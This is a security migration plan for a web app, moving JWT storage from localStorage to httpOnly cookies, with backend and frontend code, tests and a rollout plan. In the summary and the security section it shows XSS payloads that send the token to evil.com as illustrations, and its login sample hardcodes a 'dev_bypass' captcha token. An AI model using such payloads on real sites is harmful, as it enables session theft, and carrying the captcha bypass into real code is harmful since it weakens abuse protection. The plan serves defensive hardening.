# JWT localStorage → httpOnly Cookie Migration Plan

## Executive Summary

**Priority**: 🔴 CRITICAL-1  
**Estimated Effort**: 12 hours  
**Risk Level**: High (Breaking change for all authenticated users)  
**Impact**: Eliminates XSS attack vector for JWT token theft

### Current Security Gap

JWT tokens are stored in [`localStorage`](lib/api.ts:202) which is accessible to any JavaScript code running on the page. If an XSS vulnerability exists anywhere in the application, attackers can steal tokens and impersonate users.

**Attack Vector**: `document.location='https://evil.com?token='+localStorage.getItem('token')`

### Solution

Migrate to httpOnly cookies that are:
- Inaccessible to JavaScript (httpOnly flag)
- Only sent over HTTPS in production (secure flag)
- Restricted to same-site requests (sameSite flag)
- Automatically included in all requests by the browser

---

## Current State Analysis

### Authentication Flow Diagram

```mermaid
sequenceDiagram
    participant Browser
    participant Frontend
    participant Backend
    participant Redis
    
    Note over Browser,Redis: CURRENT FLOW (localStorage)
    
    Browser->>Frontend: User enters credentials
    Frontend->>Backend: POST /api/auth/login
    Backend->>Backend: Verify credentials
    Backend->>Backend: generateToken(user)
    Backend-->>Frontend: { user, token }
    Frontend->>Browser: localStorage.setItem('token', token)
    
    Note over Browser,Redis: Subsequent Requests
    
    Browser->>Frontend: User navigates
    Frontend->>Browser: token = localStorage.getItem('token')
    Frontend->>Backend: GET /api/users/me<br/>Authorization: Bearer {token}
    Backend->>Backend: Extract token from header
    Backend->>Redis: Check blacklist
    Backend->>Backend: Verify JWT signature
    Backend-->>Frontend: { user }
    
    Note over Browser,Redis: Socket.IO Connection
    
    Frontend->>Browser: token = localStorage.getItem('token')
    Frontend->>Backend: socket.connect({ auth: { token } })
    Backend->>Backend: Extract token from handshake.auth
    Backend->>Redis: Check blacklist
    Backend-->>Frontend: Connection established
```

### Key Files and Current Implementation

#### Backend Files

1. **[`backend/controllers/authController.js`](backend/controllers/authController.js:175-185)**
   - [`generateToken()`](backend/controllers/authController.js:175): Creates JWT with 7-day expiry
   - [`login()`](backend/controllers/authController.js:304): Returns `{ user, token }` in response body (line 350)
   - [`googleLogin()`](backend/controllers/authController.js:389): Returns `{ user, token }` in response body (line 457, 491)
   - [`register()`](backend/controllers/authController.js:224): Returns `{ user }` only - **no token** (line 266, 293)
   - [`logout()`](backend/controllers/authController.js:679): Reads token from Authorization header (line 680-682)
   - Token sent in **response body** as JSON

2. **[`backend/middleware/auth.js`](backend/middleware/auth.js:29-163)**
   - [`authenticateToken()`](backend/middleware/auth.js:29): Reads `Authorization: Bearer {token}` header (line 31-33)
   - Checks Redis blacklist (line 50-94)
   - Verifies JWT signature (line 96-97)
   - Attaches decoded user to `req.user` (line 125-133)

3. **[`backend/middleware/socketAuth.js`](backend/middleware/socketAuth.js:34-180)**
   - [`socketAuthMiddleware()`](backend/middleware/socketAuth.js:34): Reads `socket.handshake.auth.token` (line 37)
   - Same blacklist checking as HTTP auth (line 75-111)
   - Attaches user to `socket.user` (line 141-149)

4. **[`backend/server.js`](backend/server.js:355-367)**
   - CORS configured with `credentials: true` (line 356)
   - Already allows cookies from configured origins
   - **Missing**: `cookie-parser` middleware

5. **[`backend/routes/authRoutes.js`](backend/routes/authRoutes.js:72-88)**
   - Defines auth endpoints: `/register`, `/login`, `/logout`, `/google`, `/forgot-password`, `/reset-password`, `/me`
   - All use rate limiting
   - Logout requires `authenticateToken` middleware

#### Frontend Files

1. **[`lib/api.ts`](lib/api.ts:201-237)**
   - [`fetchAPI()`](lib/api.ts:201): Main API client function
   - **Line 202**: `const token = localStorage.getItem('token')` ← **XSS VULNERABLE**
   - **Line 210**: Adds `Authorization: Bearer ${token}` header
   - No `credentials: 'include'` option

2. **[`contexts/AuthContext.tsx`](contexts/AuthContext.tsx:31-214)**
   - [`login()`](contexts/AuthContext.tsx:114-121): Stores token in localStorage (line 115-116)
   - [`logout()`](contexts/AuthContext.tsx:126-138): Removes token from localStorage (line 132-134)
   - [`restoreSession()`](contexts/AuthContext.tsx:40-106): Reads token from localStorage (line 42-48)
   - Calls [`api.auth.verifyToken()`](lib/api.ts:322-333) on mount

3. **[`lib/socket.ts`](lib/socket.ts:49-190)**
   - [`SocketService.getToken()`](lib/socket.ts:55-62): Reads from localStorage (line 56)
   - [`connect()`](lib/socket.ts:67-113): Sends token in `auth` object (line 74)
   - Socket.IO handshake includes `{ auth: { token } }`

---

## Migration Strategy

### Phase 1: Backend Preparation (Backward Compatible)

**Goal**: Accept both cookie AND Authorization header for gradual rollout

#### Step 1.1: Install cookie-parser

```bash
npm install cookie-parser
```

Update [`package.json`](package.json):
```json
{
  "dependencies": {
    "cookie-parser": "^1.4.6"
  }
}
```

#### Step 1.2: Add cookie-parser middleware

Update [`backend/server.js`](backend/server.js:355-367):
```javascript
const cookieParser = require('cookie-parser');

// Add BEFORE CORS middleware
app.use(cookieParser());

// Existing CORS config already has credentials: true ✓
app.use(cors({
  origin: allowedOrigins,
  credentials: true, // Already present
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

#### Step 1.3: Update generateToken to set httpOnly cookie

Update [`backend/controllers/authController.js`](backend/controllers/authController.js:175-185):

```javascript
/**
 * Generate JWT token and set it as httpOnly cookie
 * Also returns token in response body for backward compatibility during migration
 */
const generateTokenAndSetCookie = (user, res) => {
    const token = jwt.sign(
        {
            id: user.id,
            role: user.role || 'user',
            isAdmin: Boolean(user.isAdmin ?? user.is_admin ?? false),
        },
        ***REMOVED***,
        { expiresIn: '7d' }
    );

    // Set httpOnly cookie
    const isProduction = process.env.NODE_ENV === 'production';
    const cookieOptions = {
        httpOnly: true,              // Cannot be accessed by JavaScript
        secure: isProduction,        // HTTPS only in production
        sameSite: isProduction ? 'strict' : 'lax', // CSRF protection
        maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in milliseconds
        path: '/',
        domain: isProduction ? process.env.COOKIE_DOMAIN : undefined,
    };
    
    res.cookie('auth_token', token, cookieOptions);
    
    // Return token in response body for backward compatibility
    // TODO: Remove this after frontend migration is complete
    return token;
};
```

**Environment Variables** (add to [`.env.example`](.env.example) and [`.env.production.example`](.env.production.example)):
```bash
# Cookie domain for production (e.g., .cafeduo.com to work across subdomains)
COOKIE_DOMAIN=
```

#### Step 1.4: Update login/register/googleLogin to use new function

Update [`backend/controllers/authController.js`](backend/controllers/authController.js:304):

```javascript
// LOGIN - line 349-350
const token = generateTokenAndSetCookie(user, res);
return res.json({ user: toPublicUser(user), token }); // Keep token in body for now

// GOOGLE LOGIN - line 456-457
const token = generateTokenAndSetCookie(user, res);
return res.json({ user: toPublicUser(user), token });

// GOOGLE LOGIN (memory mode) - line 490-491
const token = generateTokenAndSetCookie(user, res);
return res.json({ user: toPublicUser(user), token });

// REGISTER - line 266, 293
// Register currently doesn't return token - keep as is
// Frontend calls login after register
```

#### Step 1.5: Update authenticateToken middleware (Dual Mode)

Update [`backend/middleware/auth.js`](backend/middleware/auth.js:29-163):

```javascript
const authenticateToken = async (req, res, next) => {
    // Try cookie first (new method), then Authorization header (legacy)
    let token = req.cookies?.auth_token;
    let source = 'cookie';
    
    if (!token) {
        const authHeader = req.headers['authorization'];
        const isBearer = typeof authHeader === 'string' && authHeader.startsWith('Bearer ');
        if (isBearer) {
            token = authHeader.slice(7).trim();
            source = 'header';
        }
    }

    if (!token) {
        return sendAuthError(res, {
            status: 401,
            code: 'AUTH_TOKEN_MISSING',
            message: 'Authentication required. Please login.',
        });
    }

    // Validate token format
    if (typeof token !== 'string' || token.length < 20) {
        return sendAuthError(res, {
            status: 401,
            code: 'AUTH_TOKEN_INVALID_FORMAT',
            message: 'Invalid authentication token format.',
        });
    }

    try {
        // Check blacklist
        const isBlacklisted = await checkTokenBlacklist(token);
        if (isBlacklisted) {
            return sendAuthError(res, {
                status: 401,
                code: 'AUTH_TOKEN_REVOKED',
                message: 'Token has been revoked. Please login again.',
            });
        }

        // Verify JWT
        const decoded = jwt.verify(token, ***REMOVED***);

        // Fetch user from database
        const user = await getUserById(decoded.id);
        if (!user) {
            return sendAuthError(res, {
                status: 401,
                code: 'AUTH_USER_NOT_FOUND',
                message: 'User account not found.',
            });
        }

        req.user = user;
        req.tokenSource = source; // For logging/monitoring
        next();
    } catch (err) {
        // ... existing error handling
    }
};
```

#### Step 1.6: Update socketAuth middleware (Cookie Support)

Update [`backend/middleware/socketAuth.js`](backend/middleware/socketAuth.js:34-180):

```javascript
const socketAuthMiddleware = async (socket, next) => {
    // Try to get token from cookie first, then from handshake.auth
    let token = socket.request?.cookies?.auth_token;
    let source = 'cookie';
    
    if (!token) {
        token = socket.handshake.auth?.token;
        source = 'handshake';
    }

    if (!token || typeof token !== 'string' || token.length < 20) {
        logger.warn('Socket connection rejected: No token provided', {
            socketId: socket.id,
            ip: socket.handshake.address,
        });
        return next(new Error('Authentication error: No token provided'));
    }

    try {
        // Check blacklist
        const isBlacklisted = await checkTokenBlacklist(token);
        if (isBlacklisted) {
            logger.warn('Socket connection rejected: Token has been revoked', {
                socketId: socket.id,
            });
            return next(new Error('Authentication error: Token revoked'));
        }

        // Verify JWT
        const decoded = jwt.verify(token, ***REMOVED***);

        // Fetch user
        const user = await getUserById(decoded.id);
        if (!user) {
            logger.warn('Socket connection rejected: User not found', {
                socketId: socket.id,
                userId: decoded.id,
            });
            return next(new Error('Authentication error: User not found'));
        }

        socket.user = user;
        socket.tokenSource = source; // For monitoring

        logger.info('Socket authenticated successfully', {
            socketId: socket.id,
            userId: user.id,
            username: user.username,
            source,
        });

        next();
    } catch (err) {
        // ... existing error handling
    }
};
```

**Important**: Socket.IO must be configured to parse cookies. Update [`backend/server.js`](backend/server.js:256-262):

```javascript
const io = new Server(server, {
  cors: {
    origin: allowedOrigins,
    credentials: true,
  },
  // Add cookie parser for Socket.IO
  cookieParser: cookieParser, // Pass the same instance
});
```

Actually, Socket.IO v4 requires manual cookie parsing. Better approach:

```javascript
// Before socketAuthMiddleware
io.use((socket, next) => {
  // Parse cookies from Socket.IO handshake
  const cookieHeader = socket.handshake.headers.cookie;
  if (cookieHeader) {
    socket.request.cookies = cookieParser.signedCookies(
      require('cookie').parse(cookieHeader),
      process.env.***REMOVED*** // Use ***REMOVED*** as cookie secret
    );
  } else {
    socket.request.cookies = {};
  }
  next();
});

// Then socketAuthMiddleware
io.use(socketAuthMiddleware);
```

Install `cookie` package:
```bash
npm install cookie
```

#### Step 1.7: Update logout to clear cookie

Update [`backend/controllers/authController.js`](backend/controllers/authController.js:679-732):

```javascript
async logout(req, res) {
    // Get token from cookie or header
    let token = req.cookies?.auth_token;
    
    if (!token) {
        const authHeader = req.headers['authorization'];
        const isBearer = typeof authHeader === 'string' && authHeader.startsWith('Bearer ');
        token = isBearer ? authHeader.slice(7).trim() : null;
    }

    if (!token) {
        return res.status(400).json({ error: 'Token required for logout.' });
    }

    try {
        // Blacklist token
        const decoded = jwt.decode(token);
        if (decoded && decoded.exp) {
            const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);
            if (expiresIn > 0) {
                if (redisClient && redisClient.status === 'ready') {
                    await redisClient.setex(`blacklist:token:${token}`, expiresIn, '1');
                    logger.info('Token blacklisted', {
                        userId: decoded.id,
                        expiresIn,
                        method: 'redis'
                    });
                } else {
                    if (!global.tokenBlacklist) {
                        global.tokenBlacklist = new Map();
                    }
                    global.tokenBlacklist.set(token, decoded.exp);
                    logger.info('Token blacklisted (in-memory)', {
                        userId: decoded.id,
                        expiresIn,
                        method: 'memory'
                    });
                }
            }
        }

        // Clear cookie
        res.clearCookie('auth_token', {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production',
            sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax',
            path: '/',
        });

        return res.json({
            success: true,
            message: 'Logged out successfully.'
        });
    } catch (error) {
        logger.error('Logout error:', error);
        // Still clear cookie on error
        res.clearCookie('auth_token');
        return res.json({
            success: true,
            message: 'Logged out successfully.'
        });
    }
}
```

### Phase 2: Frontend Migration

**Goal**: Remove localStorage usage, rely on cookies

#### Step 2.1: Update fetchAPI to use credentials

Update [`lib/api.ts`](lib/api.ts:201-237):

```typescript
async function fetchAPI<TResponse = unknown>(endpoint: string, options: RequestInit = {}): Promise<TResponse> {
  const apiBaseUrl = resolveApiBaseUrl();
  const url = `${apiBaseUrl}${endpoint}`;

  // Remove localStorage token reading
  // const token = localStorage.getItem('token'); // DELETE THIS LINE

  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...((options.headers as Record<string, string>) || {}),
  };

  // Remove Authorization header logic
  // if (token) { // DELETE THIS BLOCK
  //   headers['Authorization'] = `Bearer ${token}`;
  // }

  try {
    const response = await fetch(url, {
      ...options,
      headers,
      credentials: 'include', // ADD THIS - sends cookies automatically
    });

    // ... rest of fetchAPI remains the same
  } catch (err) {
    // ... error handling
  }
}
```

#### Step 2.2: Update AuthContext to remove localStorage

Update [`contexts/AuthContext.tsx`](contexts/AuthContext.tsx:31-214):

```typescript
// Remove token parameter from login function
const login = useCallback((userData: User) => {
  setUser(userData);
  setIsAuthenticated(true);
  // REMOVE: localStorage.setItem('token', token || '');
}, []);

// Update logout to call API (which clears cookie server-side)
const logout = useCallback(async () => {
  try {
    await api.auth.logout();
  } catch (err) {
    console.error('Logout API call failed:', err);
    // Continue with local logout even if API fails
  }
  
  setUser(null);
  setIsAuthenticated(false);
  // REMOVE: localStorage.removeItem('token');
}, []);

// Update session restoration
useEffect(() => {
  const restoreSession = async () => {
    setIsLoading(true);
    
    // REMOVE: const token = localStorage.getItem('token');
    // REMOVE: if (!token) { ... }
    
    try {
      // Cookie is sent automatically via credentials: 'include'
      const userData = await api.auth.verifyToken();
      if (userData) {
        setUser(userData);
        setIsAuthenticated(true);
      }
    } catch (err) {
      console.error('Session restoration failed:', err);
      // Cookie might be invalid/expired
      setUser(null);
      setIsAuthenticated(false);
    } finally {
      setIsLoading(false);
    }
  };

  restoreSession();
}, []);
```

#### Step 2.3: Update Socket.IO client

Update [`lib/socket.ts`](lib/socket.ts:49-190):

```typescript
class SocketService {
  private socket: Socket | null = null;
  private isConnected: boolean = false;

  // REMOVE getToken method entirely
  // private getToken(): string | undefined { ... }

  connect() {
    if (this.socket?.connected) {
      return;
    }

    const socketUrl = resolveSocketUrl();

    // Remove auth object - cookie will be sent automatically
    this.socket = io(socketUrl, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
      withCredentials: true, // ADD THIS - sends cookies with Socket.IO
      // REMOVE: auth: { token: this.getToken() }
    });

    this.socket.on('connect', () => {
      this.isConnected = true;
      console.log('Socket connected:', this.socket?.id);
    });

    // ... rest of socket handlers
  }

  updateToken(token: string | null) {
    // REMOVE THIS METHOD - no longer needed
    // Cookies are managed by the browser
  }

  // ... rest of SocketService
}
```

#### Step 2.4: Update api.ts auth methods

Update [`lib/api.ts`](lib/api.ts:258-333):

```typescript
auth: {
  login: async (email: string, password: string): Promise<User> => {
    const data = await fetchAPI<AuthLoginResponse>('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email, password, captchaToken: 'dev_bypass' }),
    });
    // REMOVE: return token from response
    // Server sets cookie, just return user
    return data.user;
  },

  register: async (username: string, email: string, password: string): Promise<User> => {
    const data = await fetchAPI<AuthRegisterResponse>('/api/auth/register', {
      method: 'POST',
      body: JSON.stringify({ username, email, password }),
    });
    // Register doesn't set cookie, user must login after
    return data.user;
  },

  googleLogin: async (token: string): Promise<User> => {
    const data = await fetchAPI<AuthLoginResponse>('/api/auth/google', {
      method: 'POST',
      body: JSON.stringify({ token }),
    });
    // Server sets cookie, just return user
    return data.user;
  },

  logout: async (): Promise<void> => {
    // Server clears cookie
    await fetchAPI<void>('/api/auth/logout', {
      method: 'POST',
    });
  },

  verifyToken: async (): Promise<User | null> => {
    try {
      // Cookie sent automatically, server verifies
      const user = await fetchAPI<User>('/api/auth/me');
      return user;
    } catch (err) {
      return null;
    }
  },
},
```

#### Step 2.5: Update type definitions

Update [`types.ts`](types.ts) if needed:

```typescript
// REMOVE token from response interfaces if present
export interface AuthLoginResponse {
  user: User;
  // REMOVE: token?: string;
}

export interface AuthRegisterResponse {
  user: User;
  // REMOVE: token?: string;
}
```

### Phase 3: Testing & Validation

#### Step 3.1: Backend Tests

Create [`backend/middleware/auth.test.js`](backend/middleware/auth.test.js):

```javascript
describe('authenticateToken middleware', () => {
  it('should accept token from cookie', async () => {
    const req = {
      cookies: { auth_token: validToken },
      headers: {},
    };
    // ... assert req.user is set
  });

  it('should accept token from Authorization header (legacy)', async () => {
    const req = {
      cookies: {},
      headers: { authorization: `Bearer ${validToken}` },
    };
    // ... assert req.user is set
  });

  it('should prioritize cookie over header', async () => {
    const req = {
      cookies: { auth_token: cookieToken },
      headers: { authorization: `Bearer ${headerToken}` },
    };
    // ... assert cookie token is used
  });

  it('should reject blacklisted token from cookie', async () => {
    // ... blacklist token, assert 401 response
  });
});
```

Create [`backend/middleware/socketAuth.test.js`](backend/middleware/socketAuth.test.js):

```javascript
describe('socketAuthMiddleware', () => {
  it('should accept token from cookie', async () => {
    const socket = {
      request: { cookies: { auth_token: validToken } },
      handshake: { auth: {} },
    };
    // ... assert socket.user is set
  });

  it('should accept token from handshake.auth (legacy)', async () => {
    const socket = {
      request: { cookies: {} },
      handshake: { auth: { token: validToken } },
    };
    // ... assert socket.user is set
  });
});
```

#### Step 3.2: Frontend Tests

Update existing auth tests to remove localStorage mocking:

```typescript
// BEFORE
localStorage.setItem('token', 'mock-token');

// AFTER
// Remove localStorage usage, test API calls directly
// Cookie is set by server in tests
```

Create [`lib/api.cookies.test.ts`](lib/api.cookies.test.ts):

```typescript
describe('fetchAPI with cookies', () => {
  it('should send credentials with every request', async () => {
    const mockFetch = jest.spyOn(global, 'fetch');
    await fetchAPI('/api/users/me');
    
    expect(mockFetch).toHaveBeenCalledWith(
      expect.any(String),
      expect.objectContaining({
        credentials: 'include',
      })
    );
  });

  it('should not include Authorization header', async () => {
    const mockFetch = jest.spyOn(global, 'fetch');
    await fetchAPI('/api/users/me');
    
    const headers = mockFetch.mock.calls[0][1].headers;
    expect(headers).not.toHaveProperty('Authorization');
  });
});
```

#### Step 3.3: Integration Tests

Update [`e2e/auth.spec.ts`](e2e/auth.spec.ts):

```typescript
test('login sets httpOnly cookie', async ({ page, context }) => {
  await page.goto('/');
  await page.fill('[name="email"]', 'test@example.com');
  await page.fill('[name="password"]', 'password123');
  await page.click('button[type="submit"]');
  
  // Wait for redirect
  await page.waitForURL('/dashboard');
  
  // Check cookie is set
  const cookies = await context.cookies();
  const authCookie = cookies.find(c => c.name === 'auth_token');
  
  expect(authCookie).toBeDefined();
  expect(authCookie.httpOnly).toBe(true);
  expect(authCookie.secure).toBe(true); // In production
  expect(authCookie.sameSite).toBe('Strict');
});

test('logout clears httpOnly cookie', async ({ page, context }) => {
  // Login first
  await loginHelper(page);
  
  // Logout
  await page.click('[data-testid="logout-button"]');
  await page.waitForURL('/');
  
  // Check cookie is cleared
  const cookies = await context.cookies();
  const authCookie = cookies.find(c => c.name === 'auth_token');
  
  expect(authCookie).toBeUndefined();
});

test('expired cookie redirects to login', async ({ page, context }) => {
  // Set expired cookie
  await context.addCookies([{
    name: 'auth_token',
    value: expiredToken,
    domain: 'localhost',
    path: '/',
    httpOnly: true,
    sameSite: 'Lax',
  }]);
  
  await page.goto('/dashboard');
  
  // Should redirect to login
  await page.waitForURL('/');
  expect(page.url()).toContain('/');
});
```

#### Step 3.4: Manual Testing Checklist

**Backward Compatibility Testing (Phase 1 Complete):**
- [ ] Old clients with localStorage still work
- [ ] New clients with cookies work
- [ ] Mixed clients (some old, some new) don't conflict
- [ ] Socket.IO works with both auth methods
- [ ] Logout clears both cookie and blacklists token

**Full Migration Testing (Phase 2 Complete):**
- [ ] Login sets httpOnly cookie
- [ ] Cookie is sent automatically with API requests
- [ ] Cookie is sent with Socket.IO connections
- [ ] Logout clears cookie
- [ ] Session persists after page reload
- [ ] Session expires after 7 days
- [ ] Cannot access token via JavaScript console
- [ ] Works in incognito/private browsing
- [ ] Works across multiple tabs
- [ ] Works after browser restart

**Cross-Browser Testing:**
- [ ] Chrome
- [ ] Firefox
- [ ] Safari
- [ ] Edge
- [ ] Mobile browsers (iOS Safari, Chrome Mobile)

**Security Testing:**
- [ ] XSS injection cannot steal token
- [ ] Cookie is not sent to third-party sites (sameSite)
- [ ] Cookie is not sent over HTTP in production (secure flag)
- [ ] Blacklisted token is rejected even with valid cookie

---

## Rollout Plan

### Stage 1: Deploy Backend (Dual Mode)

**Timeline**: Day 1  
**Goal**: Accept both cookies and headers

1. Deploy Phase 1 backend changes to staging
2. Run automated test suite
3. Manual smoke test with old frontend (should still work)
4. Deploy to production
5. Monitor logs for `tokenSource` field:
   - All should be `'header'` initially
   - Confirms backward compatibility

**Rollback**: If issues, revert backend deployment. Frontend unchanged, will continue using headers.

### Stage 2: Deploy Frontend (Cookie Mode)

**Timeline**: Day 2-3  
**Goal**: Switch frontend to cookies

1. Deploy Phase 2 frontend changes to staging
2. Test login flow (should set cookie)
3. Test API calls (should send cookie)
4. Test Socket.IO (should send cookie)
5. Test logout (should clear cookie)
6. Deploy to production
7. Monitor logs for `tokenSource` field:
   - Should transition from `'header'` to `'cookie'`
   - Some users on old version may still use headers

**Rollback**: If critical issues:
1. Revert frontend deployment
2. Keep backend dual mode running
3. All users fall back to localStorage flow

### Stage 3: Monitor & Verify

**Timeline**: Week 1  
**Goal**: Ensure smooth transition

1. Monitor error rates for auth endpoints
2. Check `tokenSource` distribution:
   - Target: >95% using cookies after 48 hours
   - <5% on old cached frontend using headers
3. Monitor Socket.IO connection success rate
4. Check for any unexpected logout spikes
5. Review security logs for XSS attempts

**Metrics to Track:**
```javascript
// Add to backend logging
logger.info('Auth request', {
  endpoint: req.path,
  tokenSource: req.tokenSource, // 'cookie' or 'header'
  userId: req.user.id,
  timestamp: new Date().toISOString(),
});

// Query logs to see adoption rate
// Expected: 100% cookie within 1 week (after browser cache clears)
```

### Stage 4: Remove Legacy Support (Optional)

**Timeline**: Month 1+  
**Goal**: Clean up backward compatibility code

**Only do this after 100% adoption confirmed:**

1. Remove Authorization header reading from [`backend/middleware/auth.js`](backend/middleware/auth.js)
2. Remove `handshake.auth.token` reading from [`backend/middleware/socketAuth.js`](backend/middleware/socketAuth.js)
3. Remove `token` from login/googleLogin response bodies in [`backend/controllers/authController.js`](backend/controllers/authController.js)
4. Remove `tokenSource` logging
5. Update API documentation

**Risk**: If any old clients still exist, they will break. Monitor carefully.

---

## Environment Configuration

### Development ([`.env`](.env))

```bash
# Existing vars
NODE_ENV=development
***REMOVED***=dev_secret_at_least_64_chars_long_REPLACE_IN_PRODUCTION

# New vars for cookies
COOKIE_DOMAIN=  # Leave empty for localhost
```

### Production ([`.env.production`](.env.production.example))

```bash
# Existing vars
NODE_ENV=production
***REMOVED***=<64+ char secret from openssl rand -hex 64>

# New vars for cookies
COOKIE_DOMAIN=.yourdomain.com  # Allows cookies across subdomains
```

**Important**: If your frontend and backend are on different domains (e.g., `app.example.com` and `api.example.com`), you must:
1. Set `COOKIE_DOMAIN=.example.com` (with leading dot)
2. Ensure CORS `allowedOrigins` includes both domains
3. Use `sameSite: 'none'` with `secure: true` in production

**If using separate domains**, update cookie options in [`backend/controllers/authController.js`](backend/controllers/authController.js):

```javascript
const cookieOptions = {
    httpOnly: true,
    secure: true,  // Always true for sameSite: none
    sameSite: 'none',  // Required for cross-domain
    maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/',
    domain: process.env.COOKIE_DOMAIN,
};
```

---

## Security Considerations

### XSS Protection Improvements

**Before Migration:**
```javascript
// Attacker can steal token via XSS
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
</script>
```

**After Migration:**
```javascript
// Attacker CANNOT access httpOnly cookie
document.cookie  // "other=data" (no auth_token visible)
// Token is automatically sent by browser, never exposed to JS
```

### CSRF Protection

HttpOnly cookies are vulnerable to CSRF attacks. Mitigation:

1. **SameSite Cookie** (Primary Defense)
   - `sameSite: 'strict'` prevents cookie from being sent with cross-site requests
   - Tradeoff: Breaks if user clicks link from email/external site
   - Alternative: `sameSite: 'lax'` (allows top-level GET navigation)

2. **CORS Configuration** (Secondary Defense)
   - Already configured in [`backend/server.js`](backend/server.js:355-367)
   - Only allows requests from `allowedOrigins`
   - Browser blocks cross-origin requests without CORS headers

3. **CSRF Token** (Optional, Future Enhancement)
   - Generate random token on login, store in memory
   - Require token in `X-CSRF-Token` header for state-changing requests
   - Out of scope for this migration

**Recommendation**: Use `sameSite: 'lax'` for better UX, rely on CORS for CSRF protection.

### Token Blacklist Compatibility

Current blacklist uses full JWT token as key:
```javascript
// Redis key format
`blacklist:token:${fullTokenString}`
```

This works for both cookie and header-based auth since:
1. Same token is used in both methods
2. Logout blacklists the token regardless of source
3. Middleware checks blacklist before verifying JWT

**No changes needed** to blacklist logic.

### Session Hijacking Risk

HttpOnly cookies don't prevent session hijacking if:
1. User's device is compromised (keylogger, malware)
2. Man-in-the-middle attack on non-HTTPS connection
3. Physical access to device

**Mitigations in place:**
- HTTPS enforced in production (`secure: true`)
- 7-day expiry limits damage window
- Token blacklist allows immediate revocation
- Rate limiting prevents brute force

**Future enhancements:**
- Add IP address validation (high friction)
- Add device fingerprinting (privacy concerns)
- Add "logout all devices" feature (requires session tracking)

---

## Troubleshooting Guide

### Issue: Cookie not being set

**Symptoms**: Login succeeds but no `auth_token` cookie in browser DevTools

**Debugging**:
1. Check backend logs for `generateTokenAndSetCookie` calls
2. Verify `res.cookie()` is called before `res.json()`
3. Check browser console for CORS errors
4. Verify `credentials: true` in backend CORS config
5. Verify `credentials: 'include'` in frontend fetchAPI

**Common Causes**:
- CORS not allowing credentials
- Frontend not sending `credentials: 'include'`
- Cookie domain mismatch (e.g., `localhost` vs `127.0.0.1`)
- Browser blocking third-party cookies (if using separate domains)

**Fix**:
```javascript
// Backend: Ensure CORS allows credentials
app.use(cors({
  origin: allowedOrigins,
  credentials: true,  // Must be true
}));

// Frontend: Ensure fetch sends credentials
fetch(url, {
  credentials: 'include',  // Must be 'include'
});
```

### Issue: Cookie not being sent with requests

**Symptoms**: API returns 401 "Authentication required" after login

**Debugging**:
1. Check Network tab → request headers → Cookie header
2. Verify cookie domain matches request domain
3. Check cookie sameSite setting (Strict may block some requests)
4. Verify cookie hasn't expired

**Common Causes**:
- Cookie domain mismatch
- SameSite=Strict blocking cross-site navigation
- Cookie expired (check maxAge)
- Browser blocking cookies (privacy settings)

**Fix**:
```javascript
// If using subdomains, set cookie domain
domain: '.yourdomain.com'  // Leading dot allows subdomains

// If users navigate from external links, use lax
sameSite: 'lax'  // Instead of 'strict'
```

### Issue: Socket.IO not authenticating

**Symptoms**: Socket connection fails with "Authentication error"

**Debugging**:
1. Check socket middleware receives cookies: `socket.request.cookies`
2. Verify cookie parsing is set up correctly
3. Check Socket.IO client uses `withCredentials: true`
4. Test with browser that allows cookies (not incognito in some browsers)

**Common Causes**:
- Socket.IO not parsing cookies from handshake
- Frontend Socket client not sending `withCredentials`
- Cookie domain doesn't match Socket.IO endpoint

**Fix**:
```javascript
// Backend: Parse cookies for Socket.IO
io.use((socket, next) => {
  const cookieHeader = socket.handshake.headers.cookie;
  socket.request.cookies = cookieHeader 
    ? require('cookie').parse(cookieHeader)
    : {};
  next();
});

// Frontend: Send credentials with Socket.IO
io(socketUrl, {
  withCredentials: true,
});
```

### Issue: Logout doesn't clear cookie

**Symptoms**: User still authenticated after logout

**Debugging**:
1. Check backend calls `res.clearCookie()`
2. Verify clearCookie options match cookie-setting options
3. Check browser DevTools → Application → Cookies (should be removed)
4. Verify token is blacklisted (check Redis)

**Common Causes**:
- clearCookie options don't match cookie options (domain, path)
- Browser caching stale cookie
- Token not blacklisted (old token still valid)

**Fix**:
```javascript
// Ensure clearCookie options match cookie options
res.clearCookie('auth_token', {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax',
  path: '/',
  domain: process.env.COOKIE_DOMAIN,  // Must match
});
```

### Issue: CORS errors after migration

**Symptoms**: Browser console shows "CORS policy blocked" errors

**Debugging**:
1. Check browser error message for specific CORS issue
2. Verify backend CORS config allows credentials
3. Check `allowedOrigins` includes frontend domain
4. Verify frontend uses correct API base URL

**Common Causes**:
- `credentials: true` not set in backend
- Frontend origin not in `allowedOrigins`
- Wildcard origin (`*`) used with credentials (not allowed)

**Fix**:
```javascript
// Backend: Use specific origins, not wildcard
const allowedOrigins = [
  'https://yourdomain.com',
  'https://www.yourdomain.com',
];

app.use(cors({
  origin: allowedOrigins,  // Not '*'
  credentials: true,
}));
```

---

## Performance Impact

### Cookie Size Overhead

**Current (Authorization header)**:
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
~200 bytes per request
```

**After (Cookie header)**:
```
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
~210 bytes per request
```

**Impact**: +10 bytes per request (~5% increase)
- Negligible for modern networks
- Sent only to same origin (no third-party leak)

### Browser Caching

Cookies are sent with every request, including:
- Static assets (CSS, JS, images) ← **Overhead**
- API calls ← **Necessary**
- Cached resources ← **Unnecessary**

**Mitigation**: Serve static assets from cookieless domain
```javascript
// Serve static files from CDN without cookies
// Frontend: https://app.yourdomain.com (has cookies)
// Static: https://static.yourdomain.com (no cookies)
```

Out of scope for this migration, but consider for future optimization.

### localStorage vs Cookie Performance

**localStorage** (current):
- Synchronous operation (blocks JS thread)
- ~5ms per read/write on slow devices
- Must be read on every API call

**Cookie** (new):
- Automatically sent by browser (no JS overhead)
- No localStorage access needed
